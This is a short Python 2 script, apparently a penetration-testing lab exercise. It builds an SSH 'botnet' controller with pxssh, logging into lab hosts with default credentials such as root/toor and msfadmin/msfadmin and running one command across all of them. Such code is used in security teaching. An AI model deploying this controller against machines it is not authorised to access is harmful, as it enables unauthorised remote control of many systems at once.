#!/usr/bin/python

import pxssh

class Client:
	def __init__(self, host, user, password):
		self.host = host
		self.user = user
		self.password = password
		self.session = self.connect()
	
	def connect(self):
#		print '%r' % self.host
#		print '%r' % self.user
#		print '%r' % self.password
		try:
#			print 'inside'
			s = pxssh.pxssh()
			s.login(self.host, self.user, self.password, auto_prompt_reset=False)
			s.sendline('uname -a')
			s.prompt()
			print s.before
#			print s
			return s
		except Exception, e:
			print e
			print '[-] Error Connecting'
	
	def send_command(self, cmd):
#		print '%r' % cmd
#		print self.session
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before

def botnetCommand(command):
	for client in botNet:
#		print 'made it here'
#		print client
		output = client.send_command(command)
		print '[*] Output from ' + client.host
		print '[+] ' + output + '\n'

def addClient(host, user, password):
#	print host
#	print user
#	print password
	client = Client(host, user, password)
	botNet.append(client)

botNet = []
#addClient('192.168.138.133', 'root', 'toor')
addClient('192.168.138.130', 'root', 'toor')
#addClient('192.168.138.129', 'msfadmin', 'msfadmin')

#print botNet
#botnetCommand('uname -v')
#botnetCommand('cat /etc/issue')	
